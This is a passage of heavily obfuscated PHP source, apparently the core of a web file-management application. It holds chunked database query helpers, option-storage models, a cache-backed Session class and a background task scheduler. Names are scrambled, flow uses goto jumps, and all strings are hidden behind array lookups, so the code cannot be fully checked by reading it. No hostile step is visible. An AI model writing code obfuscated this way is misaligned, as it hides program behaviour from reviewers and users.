$Fâ­Ò±åÊˆ); if (!is_array($D²Äßœ’ä) || count($D²Äßœ’ä) == 0) { break; } $EÏÀ˜´÷ôÓ[$D¾«À“Î¢[272]][$cÁÕ ÃŠ³ƒ][1] = $D²Äßœ’ä; $this->optionsValue($EÏÀ˜´÷ôÓ); $d‚¸¡Æáƒ += parent::save($a±”Ø§Éé¦, $cÉêÈ¬ ï); $this->chunkEventCheck(count($D²Äßœ’ä)); } $this->chunkEventSet(); return $d‚¸¡Æáƒ; goto B…¬ÏË”†; C«¼íµ”—½: $DÑĞÈ¿°í = $EÏÀ˜´÷ôÓ[$D¾«À“Î¢[272]][$cÁÕ ÃŠ³ƒ][1]; $DÑĞÈ¿°í = is_array($DÑĞÈ¿°í) ? $DÑĞÈ¿°í : array(); $D•ª¤øîá = count($DÑĞÈ¿°í); goto C¸¦ò¦¦¬; Dã¥·‡êáŒ: $D¾«À“Î¢ =& $_SERVER[´¬]; $Fâ­Ò±åÊˆ = self::SQL_WHERE_IN_CHUNK; $EÏÀ˜´÷ôÓ = $this->optionsValue(); goto E¼ª˜²×Ô¤; B…¬ÏË”†: } public function add($dÚÂ¶‡„ùĞ = '', $F½ÀÊ¦è = array(), $C¬î‘ˆö¾¦ = false) { if ($this->addTaskStatus && is_array($dÚÂ¶‡„ùĞ)) { $this->addTaskData[] = $dÚÂ¶‡„ùĞ; return; } return parent::add($dÚÂ¶‡„ùĞ, $F½ÀÊ¦è, $C¬î‘ˆö¾¦); } public function parseWhereLike($f¬ŸÊ³‹¼Ê, $AÚÎİ”ã = '', $D§¹öââÒ = false, &$c™…´å¯°› = false) { goto A®ÊÇĞãí‹; fÌ‰®ÒÉ‹’: if (!is_array($f¬ŸÊ³‹¼Ê)) { return $f¬ŸÊ³‹¼Ê; } $A…©Ã ¬Š = array(); $FáÌñ˜èŸ = 0; goto E Ğˆ‡æ¾; E Ğˆ‡æ¾: foreach ($f¬ŸÊ³‹¼Ê as $E‹Ø¹„®Ö => $aã¹»³õ‡Ò) { if (is_array($aã¹»³õ‡Ò) && count($aã¹»³õ‡Ò) == 2 && $aã¹»³õ‡Ò[0] == $f‚àïäƒª¶[379] && is_string($aã¹»³õ‡Ò[1]) && substr($aã¹»³õ‡Ò[1], 0, 1) == $f‚àïäƒª¶[380] && substr($aã¹»³õ‡Ò[1], strlen($aã¹»³õ‡Ò[1]) - 1, 1) == $f‚àïäƒª¶[380]) { goto a‡ò¯øœ‰Ê; D£òŞ¿ÌÁÛ: continue; goto c¿ÑÁÜ‚ˆ; CóŸ¶©Ö°¦: if ($d½Õè„„°½[$f‚àïäƒª¶[382]]) { $EâĞ’¢¨ô¥ = $f‚àïäƒª¶[383] . $eô…›¶Û  . $f‚àïäƒª¶[384]; if ($d½Õè„„°½[$f‚àïäƒª¶[385]]) { $EâĞ’¢¨ô¥ = $f‚àïäƒª¶[384] . $eô…›¶Û  . $f‚àïäƒª¶[383]; } } $A…©Ã ¬Š[$FáÌñ˜èŸ] = $f‚àïäƒª¶[386] . $eÜ‡­×„”Í . $f‚àïäƒª¶[387] . $EâĞ’¢¨ô¥ . $f‚àïäƒª¶[388]; $FáÌñ˜èŸ++; goto D£òŞ¿ÌÁÛ; a‡ò¯øœ‰Ê: $c™…´å¯°› = !0; $eÜ‡­×„”Í = is_string($E‹Ø¹„®Ö) ? $E‹Ø¹„®Ö : $AÚÎİ”ã; $eô…›¶Û  = substr($aã¹»³õ‡Ò[1], 1, strlen($aã¹»³õ‡Ò[1]) - 2); goto aï—Œâ›Ü®; aï—Œâ›Ü®: $eô…›¶Û  = $this->db->escapeString($eô…›¶Û ); if (!strpos($eÜ‡­×„”Í, $f‚àïäƒª¶[95])) { $eÜ‡­×„”Í = $f‚àïäƒª¶[381] . $eÜ‡­×„”Í . $f‚àïäƒª¶[381]; } $EâĞ’¢¨ô¥ = $f‚àïäƒª¶[182] . $eô…›¶Û  . $f‚àïäƒª¶[182]; goto CóŸ¶©Ö°¦; c¿ÑÁÜ‚ˆ: } if (is_array($aã¹»³õ‡Ò)) { $AÚÎİ”ã = is_string($E‹Ø¹„®Ö) ? $E‹Ø¹„®Ö : $AÚÎİ”ã; $aã¹»³õ‡Ò = $this->parseWhereLike($aã¹»³õ‡Ò, $AÚÎİ”ã, !0, $c™…´å¯°›); } if (is_numeric($E‹Ø¹„®Ö)) { $A…©Ã ¬Š[$FáÌñ˜èŸ] = $aã¹»³õ‡Ò; $FáÌñ˜èŸ++; } else { $A…©Ã ¬Š[$E‹Ø¹„®Ö] = $aã¹»³õ‡Ò; } } if ($c™…´å¯°› && !$D§¹öââÒ) { } return $A…©Ã ¬Š; goto Cù‚Ñß„”ò; A®ÊÇĞãí‹: $f‚àïäƒª¶ =& $_SERVER[´¬]; $d½Õè„„°½ = $GLOBALS[$f‚àïäƒª¶[6]][$f‚àïäƒª¶[377]]; if (!$d½Õè„„°½[$f‚àïäƒª¶[378]]) { return $f¬ŸÊ³‹¼Ê; } goto fÌ‰®ÒÉ‹’; Cù‚Ñß„”ò: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($cŠĞ‰çˆÈ = array()) { goto eª”ÔÊ‰äÈ; fäŸöŞ…íá: return $E¹é¾áõŠ¾; goto C‚Š‘³˜¯ ; cé§ó²®äĞ: $d‡¼ÄÖ’õ© = is_array($d‡¼ÄÖ’õ©) ? $d‡¼ÄÖ’õ© : array(); $E¹é¾áõŠ¾ = null; for ($eœÂ­±Çä = 0; $eœÂ­±Çä < count($d‡¼ÄÖ’õ©); $eœÂ­±Çä += $D‰Ñ‡óÌ‹) { $C± ìÌÔ¿Œ = array_slice($d‡¼ÄÖ’õ©, $eœÂ­±Çä, $D‰Ñ‡óÌ‹); if (!is_array($C± ìÌÔ¿Œ) || count($C± ìÌÔ¿Œ) == 0) { break; } $d·Ö˜ƒÂÜâ[$e­ˆÇîèÆ[272]][$bà¯Ğä×›†][1] = $C± ìÌÔ¿Œ; $this->optionsValue($d·Ö˜ƒÂÜâ); $Eé¼óõ¡¥Â = parent::select($cŠĞ‰çˆÈ); if (!$Eé¼óõ¡¥Â) { continue; } $E¹é¾áõŠ¾ = is_array($E¹é¾áõŠ¾) ? $E¹é¾áõŠ¾ : array(); $E¹é¾áõŠ¾ = array_merge($E¹é¾áõŠ¾, $Eé¼óõ¡¥Â); } goto fäŸöŞ…íá; eª”ÔÊ‰äÈ: $e­ˆÇîèÆ =& $_SERVER[´¬]; $D‰Ñ‡óÌ‹ = self::SQL_WHERE_IN_CHUNK; $d·Ö˜ƒÂÜâ = $this->optionsValue(); goto eˆİè™ğËæ; eˆİè™ğËæ: $bà¯Ğä×›† = $this->findWhereField($d·Ö˜ƒÂÜâ); if (!$bà¯Ğä×›† || isset($d·Ö˜ƒÂÜâ[$e­ˆÇîèÆ[289]]) || isset($d·Ö˜ƒÂÜâ[$e­ˆÇîèÆ[350]])) { return parent::select($cŠĞ‰çˆÈ); } $d‡¼ÄÖ’õ© = $d·Ö˜ƒÂÜâ[$e­ˆÇîèÆ[272]][$bà¯Ğä×›†][1]; goto cé§ó²®äĞ; C‚Š‘³˜¯ : } public function delete($AÔ½µšÆŒ‰ = array()) { goto BÕ§±¬È; a‰Ş‰í¢¿¾: $DãóÙÊİ”– = $B†Ñ¶·ƒ¯Ò[$f¡ó„Š¶Ë[272]][$e×Ñæ¥”æ‚][1]; $DãóÙÊİ”– = is_array($DãóÙÊİ”–) ? $DãóÙÊİ”– : array(); for ($aŠ˜íŠÈ’— = 0; $aŠ˜íŠÈ’— < count($DãóÙÊİ”–); $aŠ˜íŠÈ’— += $D–êÄ‰ ¦) { $FÓ¹ß½ˆŒÈ = array_slice($DãóÙÊİ”–, $aŠ˜íŠÈ’—, $D–êÄ‰ ¦); if (!is_array($FÓ¹ß½ˆŒÈ) || count($FÓ¹ß½ˆŒÈ) == 0) { break; } $B†Ñ¶·ƒ¯Ò[$f¡ó„Š¶Ë[272]][$e×Ñæ¥”æ‚][1] = $FÓ¹ß½ˆŒÈ; $this->optionsValue($B†Ñ¶·ƒ¯Ò); $dï‡›Û¾ƒ += parent::delete($AÔ½µšÆŒ‰); } goto BÃÑ§ÃºÑÊ; BÕ§±¬È: $f¡ó„Š¶Ë =& $_SERVER[´¬]; $D–êÄ‰ ¦ = self::SQL_WHERE_IN_CHUNK; $B†Ñ¶·ƒ¯Ò = $this->optionsValue(); goto f‰ÂÇ‡™¾; f‰ÂÇ‡™¾: $e×Ñæ¥”æ‚ = $this->findWhereField($B†Ñ¶·ƒ¯Ò); if (!$e×Ñæ¥”æ‚) { return parent::delete($AÔ½µšÆŒ‰); } $dï‡›Û¾ƒ = 0; goto a‰Ş‰í¢¿¾; BÃÑ§ÃºÑÊ: return $dï‡›Û¾ƒ; goto a£ßÓ»™á; a£ßÓ»™á: } private function findWhereField($aö’ì¬Ú‚…) { $d¡…¹·Õá =& $_SERVER[´¬]; $aƒãÈØÄŠ = self::SQL_WHERE_IN_CHUNK; if (!is_array($aö’ì¬Ú‚…) || !is_array($aö’ì¬Ú‚…[$d¡…¹·Õá[272]])) { return !1; } foreach ($aö’ì¬Ú‚…[$d¡…¹·Õá[272]] as $fÌ¿£›Â => $eœ§›İª¿°) { if (is_array($eœ§›İª¿°) && isset($eœ§›İª¿°[0]) && is_string($eœ§›İª¿°[0]) && strtolower($eœ§›İª¿°[0]) == $d¡…¹·Õá[7] && is_array($eœ§›İª¿°[1]) && count($eœ§›İª¿°[1]) > $aƒãÈØÄŠ) { ignore_timeout(); return $fÌ¿£›Â; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\x65\155\x4f\x70\x74\x69\x6f\x6e"; public $field = array(); public function listData($C§äŠ·¥¯ = false, $Fˆ°Ì™Ğ = "\155\x6f\x64\x69\146\x79\x54\x69\155\145", $BäÌæØš¢² = false) { $AœêŸªÄˆ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$AœêŸªÄˆ) { return $C§äŠ·¥¯ ? null : array(); } if (!$C§äŠ·¥¯) { $AœêŸªÄˆ = array_filter(array_values($AœêŸªÄˆ)); return array_sort_by($AœêŸªÄˆ, $Fˆ°Ì™Ğ, $BäÌæØš¢²); } return $AœêŸªÄˆ[$_SERVER[´¬][389] . $C§äŠ·¥¯]; } public function insert($eÄ¬ÄÅƒœ˜) { goto D†™´‘¨¸¡; fÛ¡ÎáùÑƒ: return $b†ŞºÛœæ; goto B”«¾ƒ‚¦Ó; D‘Ì§‘‹ÅÛ: $eÄ¬ÄÅƒœ˜[$AƒÚË„’[84]] = time(); Model($this->modelType)->set($AƒÚË„’[390], $b†ŞºÛœæ, $this->optionType . $AƒÚË„’[391]); Model($this->modelType)->set($AƒÚË„’[389] . $b†ŞºÛœæ, $eÄ¬ÄÅƒœ˜, $this->optionType); goto fÛ¡ÎáùÑƒ; Eù×™ù‚ªó: $b†ŞºÛœæ = $b†ŞºÛœæ ? $b†ŞºÛœæ : 0; $eÄ¬ÄÅƒœ˜[$AƒÚË„’[392]] = ++$b†ŞºÛœæ; $eÄ¬ÄÅƒœ˜[$AƒÚË„’[193]] = time(); goto D‘Ì§‘‹ÅÛ; D†™´‘¨¸¡: $AƒÚË„’ =& $_SERVER[´¬]; $eÄ¬ÄÅƒœ˜ = array_field_key($eÄ¬ÄÅƒœ˜, $this->field); $b†ŞºÛœæ = Model($this->modelType)->get($AƒÚË„’[390], $this->optionType . $AƒÚË„’[391]); goto Eù×™ù‚ªó; B”«¾ƒ‚¦Ó: } public function update($Aäè„·Ù¥æ, $DÒ‰òÁŒ) { goto A‹ÀÖ·äèæ; cÎ®ùôñ½š: return Model($this->modelType)->set($aÇÜàÛ÷¸ê[389] . $Aäè„·Ù¥æ, $DÒ‰òÁŒ, $this->optionType); goto b’ ‰•­²“; a‡‡Æ¾£Ì: if (!$A¢¡¤ö¡‘) { return !1; } $DÒ‰òÁŒ = array_merge($A¢¡¤ö¡‘, $DÒ‰òÁŒ); $DÒ‰òÁŒ[$aÇÜàÛ÷¸ê[84]] = time(); goto cÎ®ùôñ½š; A‹ÀÖ·äèæ: $aÇÜàÛ÷¸ê =& $_SERVER[´¬]; $DÒ‰òÁŒ = array_field_key($DÒ‰òÁŒ, $this->field); $A¢¡¤ö¡‘ = $this->listData($Aäè„·Ù¥æ); goto a‡‡Æ¾£Ì; b’ ‰•­²“: } public function remove($BÈ¸ö„íÁ) { return Model($this->modelType)->remove($_SERVER[´¬][389] . $BÈ¸ö„íÁ, $this->optionType); } public function clear() { $b¸êŸÎåÂ =& $_SERVER[´¬]; Model($this->modelType)->remove($b¸êŸÎåÂ[390], $this->optionType . $b¸êŸÎåÂ[391]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($C½ƒøŒõ¸¤, $D§Úã“­ßğ) { if (!$D§Úã“­ßğ) { return !1; } $CâÍ˜“›­İ = $this->listData(); $CâÍ˜“›­İ = array_to_keyvalue($CâÍ˜“›­İ, $C½ƒøŒõ¸¤); return isset($CâÍ˜“›­İ[$D§Úã“­ßğ]) ? $CâÍ˜“›­İ[$D§Úã“­ßğ] : !1; } public function findByName($E‘¬ğ½Áê×) { return $this->findByKey($_SERVER[´¬][28], $E‘¬ğ½Áê×); } protected function resetData($E”ù‰´É) { $b£ËĞ²›è =& $_SERVER[´¬]; $E”ù‰´É = is_array($E”ù‰´É) ? $E”ù‰´É : array(); $a…‹ëšâ¾¡ = array(); for ($d»Úƒñ—® = 0; $d»Úƒñ—® < count($E”ù‰´É); $d»Úƒñ—®++) { $a…‹ëšâ¾¡[$b£ËĞ²›è[389] . $E”ù‰´É[$d»Úƒñ—®][$b£ËĞ²›è[392]]] = $E”ù‰´É[$d»Úƒñ—®]; } return Model($this->modelType)->set($a…‹ëšâ¾¡, !1, $this->optionType); } private function getAutoName($B•ÕÊªñô‹) { $E¹“œà„ƒÏ = array_to_keyvalue($this->listData(), $_SERVER[´¬][28]); if (!$E¹“œà„ƒÏ || !isset($E¹“œà„ƒÏ[$B•ÕÊªñô‹])) { return $B•ÕÊªñô‹; } for ($bÇšËÀ¬† = 1; $bÇšËÀ¬† < count($E¹“œà„ƒÏ); $bÇšËÀ¬†++) { $bØ»Æ°ÈĞª = $B•ÕÊªñô‹ . "\x28{$bÇšËÀ¬†}\51"; if (!isset($E¹“œà„ƒÏ[$bØ»Æ°ÈĞª])) { return $bØ»Æ°ÈĞª; } } return $bØ»Æ°ÈĞª; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($D¤šÔİèÒ¬ = false, $CÄùØ¼¤¬± = '', $d‰Õ´Š›Ÿ‹ = false) { goto c‡Ã×†øÊ; fÆ÷¿ÍÉâÍ: $Cƒæ»¡¥ = $this->where($C¨šĞĞ‹†ˆ)->select(); $Cƒæ»¡¥ = array_to_keyvalue($Cƒæ»¡¥, $aÒì—ÚÜˆÒ[93], $aÒì—ÚÜˆÒ[371]); foreach ($Cƒæ»¡¥ as $Eå‡šîƒŸÄ => $BİÆæ´ç¤÷) { if ($d‰Õ´Š›Ÿ‹ || in_array($Eå‡šîƒŸÄ, $this->jsonField)) { $Cƒæ»¡¥[$Eå‡šîƒŸÄ] = json_decode($BİÆæ´ç¤÷, !0); } } goto FñùÍï‹Ü; c‡Ã×†øÊ: $aÒì—ÚÜˆÒ =& $_SERVER[´¬]; $Cƒæ»¡¥ = $this->cacheGet($CÄùØ¼¤¬±); $A÷Ó£¼íè = $this->optionDefault($CÄùØ¼¤¬±); goto CÛÑ™÷ß³Ñ; CÛÑ™÷ß³Ñ: $A÷Ó£¼íè = is_array($A÷Ó£¼íè) ? $A÷Ó£¼íè : array(); if (is_array($Cƒæ»¡¥)) { $Cƒæ»¡¥ = array_merge($A÷Ó£¼íè, $Cƒæ»¡¥); return $D¤šÔİèÒ¬ ? isset($Cƒæ»¡¥[$D¤šÔİèÒ¬]) ? $Cƒæ»¡¥[$D¤šÔİèÒ¬] : null : $Cƒæ»¡¥; } $C¨šĞĞ‹†ˆ = $this->filterWhere(array($aÒì—ÚÜˆÒ[29] => $CÄùØ¼¤¬±)); goto fÆ÷¿ÍÉâÍ; FñùÍï‹Ü: $this->cacheSet($CÄùØ¼¤¬±, $Cƒæ»¡¥); $Cƒæ»¡¥ = array_merge($A÷Ó£¼íè, $Cƒæ»¡¥); return $D¤šÔİèÒ¬ ? $Cƒæ»¡¥[$D¤šÔİèÒ¬] : $Cƒæ»¡¥; goto Fñ‚£ñ†í¿; Fñ‚£ñ†í¿: } public function set($B™Û÷½±Óã, $bª©ÙÚ“Í = false, $BõÏ—–‰êæ = '') { goto Có‘¤Óô¸‹; Có‘¤Óô¸‹: $Câ†ñ…Ä‚ =& $_SERVER[´¬]; $this->cacheRemove($BõÏ—–‰êæ); $fªŞä¡šÑ = array(); goto cÇ™Ú™Ü¶¤; cÇ™Ú™Ü¶¤: $F¹¢ÃÆÚ§ƒ = is_array($B™Û÷½±Óã) ? $B™Û÷½±Óã : array($B™Û÷½±Óã => $bª©ÙÚ“Í); foreach ($F¹¢ÃÆÚ§ƒ as $BÑëîÍ÷¼ => $eÄÍ’–¼£ç) { if (is_array($eÄÍ’–¼£ç)) { $eÄÍ’–¼£ç = json_encode_force($eÄÍ’–¼£ç); } $this->checkLength($eÄÍ’–¼£ç, !1, $this->tableName . $Câ†ñ…Ä‚[4] . $B™Û÷½±Óã); $eÄÍ’–¼£ç = self::textEncode($eÄÍ’–¼£ç); $F¹¢ÃÆÚ§ƒ = array($Câ†ñ…Ä‚[29] => $BõÏ—–‰êæ, $Câ†ñ…Ä‚[93] => $BÑëîÍ÷¼, $Câ†ñ…Ä‚[371] => $eÄÍ’–¼£ç); $fªŞä¡šÑ[] = $this->filterWhere($F¹¢ÃÆÚ§ƒ); } if (!$fªŞä¡šÑ) { return !0; } goto e‹“¿í”®æ; e‹“¿í”®æ: return $this->addAll($fªŞä¡šÑ, array(), !0); goto aÒóƒ¹ë²; aÒóƒ¹ë²: } protected function optionDefault($fœİêªÙ„ç = '') { return !1; } public function setDeep($ašïÃõŸ†ª, $a¿™ï„£é  = false, $f–çğÚğ…° = '') { $e†½î¶êäÛ = explode($_SERVER[´¬][95], $ašïÃõŸ†ª); $Fç¦æÄÄá = $this->get(); array_set_value($Fç¦æÄÄá, $ašïÃõŸ†ª, $a¿™ï„£é ); $this->set($e†½î¶êäÛ[0], $Fç¦æÄÄá[$e†½î¶êäÛ[0]], $f–çğÚğ…°); } public function remove($Fáğ»¦Şã, $Eî»†ÂìŒ = '') { $eÂ§­È­… =& $_SERVER[´¬]; $this->cacheRemove($Eî»†ÂìŒ); $C¯°¸„½à© = $this->filterWhere(array($eÂ§­È­…[93] => $Fáğ»¦Şã, $eÂ§­È­…[29] => $Eî»†ÂìŒ)); if (is_null($Fáğ»¦Şã)) { unset($C¯°¸„½à©[$eÂ§­È­…[93]]); } return $this->where($C¯°¸„½à©)->delete(); } public function cacheSet($dˆÊ•¨Ñ‹, $DĞ‡ùƒ÷ = false) { return Cache::set($this->cacheKey($dˆÊ•¨Ñ‹), $DĞ‡ùƒ÷); } public function cacheGet($aèÄ­´³ø) { return Cache::get($this->cacheKey($aèÄ­´³ø)); } public function cacheRemove($aÒŞ©ô¹øª) { return Cache::remove($this->cacheKey($aÒŞ©ô¹øª)); } protected function filterWhere($D»Â¼Á°Î) { return $D»Â¼Á°Î; } protected function cacheKey($Fî¹éğƒâ) { return $Fî¹éğƒâ; } } goto FÔ°ª¥’‹ô; B²¬¦™’¯î: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto FÄÇêõ˜‡İ; b×¥œßÕ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $eŞùØ¯ÌÊŞ = new self(); return $eŞùØ¯ÌÊŞ; goto f˜ƒù“’ÎÎ; FÄÇêõ˜‡İ: $aˆ²ŠÌ¨ĞË =& $_SERVER[´¬]; static $eŞùØ¯ÌÊŞ = false; if ($eŞùØ¯ÌÊŞ) { return $eŞùØ¯ÌÊŞ; } goto ešĞŠæ¸÷â; fŞÜ·º¦ŞŒ: if (self::$sessionSign) { } else { if (Cookie::get($Dëä´Ãİ±)) { self::$sessionSign = Cookie::get($Dëä´Ãİ±); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Dëä´Ãİ±, self::$sessionSign, self::$sessionTime); $FÅç¢ƒ–ö– = $d¨§¤ºÉ‹µ[$aˆ²ŠÌ¨ĞË[1488]]; goto F¸åŞø‡‹; ešĞŠæ¸÷â: $d¨§¤ºÉ‹µ = $GLOBALS[$aˆ²ŠÌ¨ĞË[6]][$aˆ²ŠÌ¨ĞË[346]]; self::$sessionTime = $d¨§¤ºÉ‹µ[$aˆ²ŠÌ¨ĞË[1486]]; $Dëä´Ãİ± = isset($GLOBALS[$aˆ²ŠÌ¨ĞË[1487]]) ? $GLOBALS[$aˆ²ŠÌ¨ĞË[1487]] : SESSION_ID; goto fŞÜ·º¦ŞŒ; F¸åŞø‡‹: $b†Â›“¼…… = $d¨§¤ºÉ‹µ[$FÅç¢ƒ–ö–]; $fèŒ‰ªÇï¼ = $d¨§¤ºÉ‹µ[$aˆ²ŠÌ¨ĞË[793]]; switch ($FÅç¢ƒ–ö–) { case $aˆ²ŠÌ¨ĞË[17]: self::$handle = Model($aˆ²ŠÌ¨ĞË[794]); break; case $aˆ²ŠÌ¨ĞË[795]: self::$handle = new CacheRedis($b†Â›“¼……, $fèŒ‰ªÇï¼); break; case $aˆ²ŠÌ¨ĞË[796]: self::$handle = new CacheMemcached($b†Â›“¼……, $fèŒ‰ªÇï¼); break; case $aˆ²ŠÌ¨ĞË[192]: $b†Â›“¼……[$aˆ²ŠÌ¨ĞË[76]] = $b†Â›“¼……[$aˆ²ŠÌ¨ĞË[76]] . $aˆ²ŠÌ¨ĞË[1489]; self::$handle = new CacheFile($b†Â›“¼……, $fèŒ‰ªÇï¼); default: break; } goto b×¥œßÕ; f˜ƒù“’ÎÎ: } public static function sign($cƒù£ÍÒìò = false) { $cƒù£ÍÒìò && (self::$sessionSign = $cƒù£ÍÒìò); self::init(); return self::$sessionSign; } public static function set($cÑéÆŠ£Ü, $Bç›”‰™ó = false) { self::init(); if (is_array($cÑéÆŠ£Ü)) { foreach ($cÑéÆŠ£Ü as $Dµ”ö„‹ => $eäì“…ôÎ¶) { array_set_value(self::$data, $Dµ”ö„‹, $eäì“…ôÎ¶); } } else { array_set_value(self::$data, $cÑéÆŠ£Ü, $Bç›”‰™ó); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($f¥¯Ï¿¸‰é = false) { self::init(); if (!$f¥¯Ï¿¸‰é) { return self::$data; } return array_get_value(self::$data, $f¥¯Ï¿¸‰é); } public static function remove($CÈºßÔ’Ô) { self::init(); unset(self::$data[$CÈºßÔ’Ô]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[´¬][798])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto C¡ñÓ’Çƒ‡; C¡ñÓ’Çƒ‡: $AŠÉò»¹ =& $_SERVER[´¬]; if (self::valueGet($AŠÉò»¹[713]) != $AŠÉò»¹[87]) { return; } if (self::valueGet($AŠÉò»¹[1490]) == $AŠÉò»¹[87]) { $e¯÷ÍÀÓ¼ğ = self::valueGet($AŠÉò»¹[1491]); if (time() - $e¯÷ÍÀÓ¼ğ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto bğñ©š–™—; DÏ¦ª™¸›: while (!0) { self::cacheClear(); if (self::valueGet($AŠÉò»¹[713]) != $AŠÉò»¹[87]) { self::valueSet($AŠÉò»¹[1490], $AŠÉò»¹[495]); self::log($AŠÉò»¹[1494]); die; } self::valueSet($AŠÉò»¹[1490], $AŠÉò»¹[87]); self::valueSet($AŠÉò»¹[1491], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto aÁ‘Á¦Şâá; bğñ©š–™—: http_close(); self::valueSet($AŠÉò»¹[1490], $AŠÉò»¹[87]); Hook::bind($AŠÉò»¹[1492], $AŠÉò»¹[1493]); goto DÏ¦ª™¸›; aÁ‘Á¦Şâá: } public static function restart() { $F¦»Í–‹Î =& $_SERVER[´¬]; http_close(); self::valueSet($F¦»Í–‹Î[713], $F¦»Í–‹Î[495]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($F¦»Í–‹Î[1490], $F¦»Í–‹Î[495]); self::valueSet($F¦»Í–‹Î[713], $F¦»Í–‹Î[87]); } public static function shutdownEvent() { $D’¾î—š® =& $_SERVER[´¬]; self::valueSet($D’¾î—š®[1490], $D’¾î—š®[495]); self::log($D’¾î—š®[1495]); } public static function config($Dë´ù¬•‰À, $fÑ¶Ã†¡È¤) { self::valueSet($_SERVER[´¬][713], $Dë´ù¬•‰À); } private static function taskRunAll() { goto có­×Õ‚•; a‚” ößµÛ: self::taskQueueRun($b¤çö»ÙÊ); self::closeDatabase(); goto AôŠ…êˆ§; CÏç»ì§µ: $CœÑÌ»ĞÓ• = count($F”äÕ‚Î); for ($b­ìÔ½›Ù = 0; $b­ìÔ½›Ù < $CœÑÌ»ĞÓ•; $b­ìÔ½›Ù++) { $FŒÓí¨ĞÀÉ = $F”äÕ‚Î[$b­ìÔ½›Ù]; if (!$FŒÓí¨ĞÀÉ[$EÒÖõåË…ã[392]] || $FŒÓí¨ĞÀÉ[$EÒÖõåË…ã[1497]] != $EÒÖõåË…ã[87]) { continue; } if (!self::taskTimeCheck($FŒÓí¨ĞÀÉ)) { continue; } self::taskRun($FŒÓí¨ĞÀÉ); } Hook::trigger($EÒÖõåË…ã[1498]); goto a‚” ößµÛ; có­×Õ‚•: $EÒÖõåË…ã =& $_SERVER[´¬]; $b¤çö»ÙÊ = timeFloat(); $F”äÕ‚Î = Model($EÒÖõåË…ã[1496])->listData(); goto CÏç»ì§µ; AôŠ…êˆ§: } private static function taskQueueRun($cÁùñù…) { $Dê÷¼¨ŒõÑ = 10; while (!0) { $aµÊÄè³ˆì = TaskQueue::run(); if ($aµÊÄè³ˆì === !1) { break; } if (timeFloat() - $cÁùñù… >= $Dê÷¼¨ŒõÑ) { break; } } } private static function taskTimeCheck($C®ö»†¿ß) { goto E¨ğ•íÙ‹†; E¨ğ•íÙ‹†: $DÔª÷ˆÈ×ª =& $_SERVER[´¬]; $fëÃ†½µí = json_decode($C®ö»†¿ß[$DÔª÷ˆÈ×ª[196]], !0); $CĞªğƒë‰İ = intval($C®ö»†¿ß[$DÔª÷ˆÈ×ª[1491]]); goto cäìæ²ã¢Ó; BÉáĞŠè‹: switch ($fëÃ†½µí[$DÔª÷ˆÈ×ª[29]]) { case $DÔª÷ˆÈ×ª[1505]: if (time() - $CĞªğƒë‰İ < 3600 * 24 * 30) { return !1; } if ($fëÃ†½µí[$DÔª÷ˆÈ×ª[1505]] == date($DÔª÷ˆÈ×ª[1506]) && $C¢ÚÖ‚ÇÄÇ) { return !0; } break; case $DÔª÷ˆÈ×ª[1507]: if (time() - $CĞªğƒë‰İ < 3600 * 24 * 7) { return !1; } $dä›»«â = date($DÔª÷ˆÈ×ª[1508]) == 0 ? 7 : date($DÔª÷ˆÈ×ª[1508]); if ($fëÃ†½µí[$DÔª÷ˆÈ×ª[1507]] == $dä›»«â && $C¢ÚÖ‚ÇÄÇ) { return !0; } break; case $DÔª÷ˆÈ×ª[1500]: if (time() - $CĞªğƒë‰İ < 3600 * 24) { return !1; } if ($C¢ÚÖ‚ÇÄÇ) { return !0; } break; case $DÔª÷ˆÈ×ª[1509]: if (time() - $CĞªğƒë‰İ >= floatval($fëÃ†½µí[$DÔª÷ˆÈ×ª[1509]]) * 60) { return !0; } break; default: break; } return !1; goto B—¦ç äÕğ; cäìæ²ã¢Ó: $a¥ã›Š‹À = strtotime($DÔª÷ˆÈ×ª[1499] . $fëÃ†½µí[$DÔª÷ˆÈ×ª[1500]] . $DÔª÷ˆÈ×ª[1501]) - strtotime($DÔª÷ˆÈ×ª[1502]); $FÃ‡ˆì‰†¸ = time() - strtotime(date($DÔª÷ˆÈ×ª[1503]) . $DÔª÷ˆÈ×ª[1504]); $C¢ÚÖ‚ÇÄÇ = $FÃ‡ˆì‰†¸ >= $a¥ã›Š‹À && $FÃ‡ˆì‰†¸ <= $a¥ã›Š‹À + 3600; goto BÉáĞŠè‹; B—¦ç äÕğ: } private static function closeDatabase() { goto D°ª·¢ğ³‹; D°ª·¢ğ³‹: $EŠÍ‡´ƒêó =& $_SERVER[´¬]; static $bì•›ğîŠ× = 0; $Fš¬²è˜óâ = 1800; goto dÎ¾“‡·Ä•; dÎ¾“‡·Ä•: if (!$bì•›ğîŠ×) { $bì•›ğîŠ× = time(); } if (time() - $bì•›ğîŠ× < $Fš¬²è˜óâ) { return; } $bì•›ğîŠ× = time(); goto FØ¸†Ãó˜–; FØ¸†Ãó˜–: $E•ù»»­Ñ = Model($EŠÍ‡´ƒêó[501])->db($EŠÍ‡´ƒêó[33]); if 